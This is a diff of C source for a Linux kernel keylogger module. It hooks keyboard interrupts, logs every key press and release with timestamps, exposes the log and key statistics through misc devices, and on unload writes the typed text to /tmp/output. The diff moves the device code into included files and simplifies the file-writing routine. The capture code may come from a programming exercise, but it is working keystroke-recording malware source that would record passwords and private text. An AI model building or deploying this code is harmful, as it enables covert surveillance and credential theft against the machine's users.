@@ -1,233 +1,7 @@
 #include "keylog.h"
 #include "keymap.h"
-#include <linux/mutex.h>
-#include <linux/list_sort.h>
-
-#define KEYBOARD_IRQ	1
-#define SHIFT_L		42
-#define SHIFT_R		54
-#define CAPS_LOCK	58
-#define MAX_KEYS	120
-
-#define	MODULE_NAME		"keylogger"
-#define	MODULE_STATS_NAME	"stats_keylogger"
-#define FILENAME		"/tmp/output"
-#define BUF_SIZE		PAGE_SIZE
-
-typedef ssize_t (*ksys_write_type)(unsigned int fd, const char __user *buf, size_t count);
-typedef ssize_t (*vfs_write_type)(struct file *, const char __user *, size_t, loff_t *);
-typedef long (*ksys_open_type)(const char __user *filename, int flags, umode_t mode);
-
-DEFINE_SPINLOCK(mr_lock);
-
-enum {
-	RELEASED,
-	PRESSED
-};
-
-//struct list_head	head_stroke_lst_head;
-struct proc_dir_entry	*entry;
-bool 			shift = 0;
-bool 			caps_lock = 0;
-
-LIST_HEAD(head_stroke_lst);
-LIST_HEAD(head_keymap_lst);
-
-int cmp_pressed(void *priv, struct list_head *a, struct list_head *b)
-{
-	struct s_keyboard_map_lst		*a_stroke = NULL;
-	struct s_keyboard_map_lst		*b_stroke = NULL;
-
-	a_stroke = list_entry(a, struct s_keyboard_map_lst, map_lst);
-	b_stroke = list_entry(b, struct s_keyboard_map_lst, map_lst);
-	return a_stroke->nb_pressed < b_stroke->nb_pressed ? 1 : 0;
-}
-
-int cmp_released(void *priv, struct list_head *a, struct list_head *b)
-{
-	struct s_keyboard_map_lst		*a_stroke = NULL;
-	struct s_keyboard_map_lst		*b_stroke = NULL;
-
-	a_stroke = list_entry(a, struct s_keyboard_map_lst, map_lst);
-	b_stroke = list_entry(b, struct s_keyboard_map_lst, map_lst);
-	return a_stroke->nb_released < b_stroke->nb_released ? 1 : 0;
-}
-
-int stats_show(struct seq_file *seq_file, void *p)
-{
-	struct s_keyboard_map	entry;
-	struct s_keyboard_map_lst	*keymap_iter = NULL;
-	struct s_keyboard_map_lst	*keymap_elem = NULL;
-	int i;
-	int j;
-
-	j = 0;
-	for (i = 0; i < MAX_KEYS; ++i) {
-		keymap_elem = kmalloc(sizeof(struct s_keyboard_map_lst ), GFP_ATOMIC);
-		entry = keyboard_mapping[i];
-		keymap_elem->key = entry.key;
-		keymap_elem->ascii = entry.ascii;
-		keymap_elem->str = entry.str;
-		keymap_elem->nb_pressed = entry.nb_pressed;
-		keymap_elem->nb_released = entry.nb_released;
-		list_add(&(keymap_elem->map_lst), &head_keymap_lst);
-	}
-	list_sort(NULL, &head_keymap_lst, cmp_pressed);
-	seq_printf(seq_file, "TOP 3 PRESSED KEYS\n");
-	list_for_each_entry(keymap_iter, &head_keymap_lst, map_lst)
-	{
-		if (keymap_iter->nb_pressed != 0 && j < 3) {
-			seq_printf(seq_file, "%s (%d) - %li times\n",
-				   keymap_iter->str,
-				   keymap_iter->key,
-			   	   keymap_iter->nb_pressed);
-			++j;
-		}
-	}
-	j = 0;
-	seq_printf(seq_file, "TOP 3 RELEASED KEYS\n");
-	list_sort(NULL, &head_keymap_lst, cmp_released);
-	list_for_each_entry(keymap_iter, &head_keymap_lst, map_lst)
-	{
-		if (keymap_iter->nb_pressed != 0 && j < 3) {
-			seq_printf(seq_file, "%s (%d) - %li times\n",
-				   keymap_iter->str,
-				   keymap_iter->key,
-			   	   keymap_iter->nb_released);
-			++j;
-		}
-		kfree(keymap_iter);
-	}
-	return 0;
-}
-
-
-
-int keylog_show(struct seq_file *seq_file, void *p)
-{
-	struct s_stroke	*strokes = NULL;
-
-	list_for_each_entry_reverse(strokes, &head_stroke_lst, stroke_lst)
-	{
-		seq_printf(seq_file, "%.2i:%.2i:%.2i: %s (%d) %s - %li\n",
-			   strokes->time.tm_hour,
-			   strokes->time.tm_min,
-			   strokes->time.tm_sec,
-			   strokes->name,
-			   strokes->key,
-			   strokes->state == RELEASED ? "RELEASED" : "PRESSED",
-			   strokes->state ? keyboard_mapping[strokes->key].nb_pressed : keyboard_mapping[strokes->key].nb_released
-			   );
-	}
-	return 0;
-}
-
-static int keylog_open(struct inode *inode, struct file *file)
-{
-	int ret;
-
-	spin_lock(&mr_lock);
-	file->private_data = NULL;
-	ret = single_open(file, &keylog_show, NULL);
-	spin_unlock(&mr_lock);
-	return ret; 
-}
-
-static ssize_t	keylog_write(struct file *file, const char __user *buf,
-			  size_t size, loff_t *offset)
-{
-	return 0;
-}
-
-static ssize_t keylog_read(struct file *file, char __user *buf, size_t size,
-			 loff_t *offset)
-{
-	int	ret;
-
-	spin_lock(&mr_lock);
-	ret = seq_read(file, buf, size, offset);
-	spin_unlock(&mr_lock);
-	return ret;
-}
-
-static int keylog_release(struct inode *inode, struct file *file)
-{
-	int	ret;
-
-	spin_lock(&mr_lock);
-	ret = single_release(inode, file);
-	spin_unlock(&mr_lock);
-	return ret;
-}
-
-static struct file_operations const keylog_file_fops = {
-	.owner		= THIS_MODULE,
-	.open = keylog_open,
-	.write = keylog_write,
-	.read = keylog_read,
-	.release = keylog_release,
-	.llseek = seq_lseek,
-};
-
-static struct miscdevice		keylog_dev = {
-	MISC_DYNAMIC_MINOR,
-	MODULE_NAME,
-	&keylog_file_fops
-};
-
-static int stats_open(struct inode *inode, struct file *file)
-{
-	int ret;
-
-	spin_lock(&mr_lock);
-	file->private_data = NULL;
-	ret = single_open(file, &stats_show, NULL);
-	spin_unlock(&mr_lock);
-	return ret; 
-}
-
-static ssize_t	stats_write(struct file *file, const char __user *buf,
-			  size_t size, loff_t *offset)
-{
-	return 0;
-}
-
-static ssize_t stats_read(struct file *file, char __user *buf, size_t size,
-			 loff_t *offset)
-{
-	int	ret;
-
-	spin_lock(&mr_lock);
-	ret = seq_read(file, buf, size, offset);
-	spin_unlock(&mr_lock);
-	return ret;
-}
-
-static int stats_release(struct inode *inode, struct file *file)
-{
-	int	ret;
-
-	spin_lock(&mr_lock);
-	ret = single_release(inode, file);
-	spin_unlock(&mr_lock);
-	return ret;
-}
-
-static struct file_operations const stats_file_fops = {
-	.owner =	THIS_MODULE,
-	.open =		stats_open,
-	.write =	stats_write,
-	.read =		stats_read,
-	.release =	stats_release,
-	.llseek =	seq_lseek,
-};
-
-static struct miscdevice		stats_dev = {
-	MISC_DYNAMIC_MINOR,
-	MODULE_STATS_NAME,
-	&stats_file_fops
-};
-
+#include "misc_stats.c"
+#include "misc_keylog.c"
 
 static void fill_stroke(struct s_stroke *new, struct s_keyboard_map *entry,
 		        struct timespec ts, unsigned char scancode)
@@ -294,49 +68,28 @@ static void write_file(struct file *filp)
 {
 	char			*output;
 	struct s_stroke		*strokes = NULL;
-	struct file		*file = NULL;
- 	loff_t			pos = 0;
 	unsigned long long offset = 0;
 	mm_segment_t oldfs;
 	int ret;
-	
-
-//	ksys_write_type	ksys_write =
-//		(void *)kallsyms_lookup_name("ksys_write");
 
 	vfs_write_type	vfs_write =
 		(void *)kallsyms_lookup_name("vfs_write");
 	
 	oldfs = get_fs();
 	set_fs(get_ds());
-
 	output = kmalloc(BUF_SIZE, GFP_KERNEL);
 	memset(output, 0, PAGE_SIZE);
 	list_for_each_entry_reverse(strokes, &head_stroke_lst, stroke_lst)
 	{
-		if (strokes->state == PRESSED) {
-			if (isprint(strokes->value)) {
-				output[strlen(output)] = strokes->value;
-			}
-			if (strokes->value == 13) {
-				offset += vfs_write(filp, output, strlen(output), &offset);
-
-				//				ksys_write(fd, output, strlen(output));
-//				file = fget(fd);
-//				if (file) {
-//					vfs_write(file, output, strlen(output), &pos);
-//					fput(file);
-//				}
-				memset(output, 0, PAGE_SIZE);
-			}
-		}
+		if (strokes->state == PRESSED &&
+		    (isprint(strokes->value) || strokes->value == 13))
+				output[strlen(output)] = strokes->value == 13 ? '\n' : strokes->value;
 		kfree(strokes);
 	}
-//	pr_err("%s\n", output);
+	ret = vfs_write(filp, output, strlen(output), &offset);
 	set_fs(oldfs);
 	filp_close(filp, NULL);
 	kfree(output);
-//	ksys_close(fd);
 }
 
 struct file *file_open(const char *path, int flags, int rights) 
@@ -358,20 +111,15 @@ struct file *file_open(const char *path, int flags, int rights)
 
 static void __exit keyboard_irq_exit(void)
 {
-	int			fd;
 	struct file *		filp = NULL;
-	
-//	ksys_open_type	ksys_open =
-//		(void *)kallsyms_lookup_name("ksys_open");
-//	mm_segment_t old_fs = get_fs();
-//	set_fs(KERNEL_DS);
-//	fd = ksys_open(FILENAME, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+
 	filp = file_open(FILENAME, O_WRONLY | O_CREAT | O_TRUNC, 0644);
   	if (filp)
 		write_file(filp);
- //	set_fs(old_fs);
-	misc_deregister(&keylog_dev);
-	misc_deregister(&stats_dev);
+//	if (keylog_dev)
+		misc_deregister(&keylog_dev);
+//	if (stats_dev)
+		misc_deregister(&stats_dev);
 	free_irq(KEYBOARD_IRQ, (void *)(keyboard_handler));
 }
 
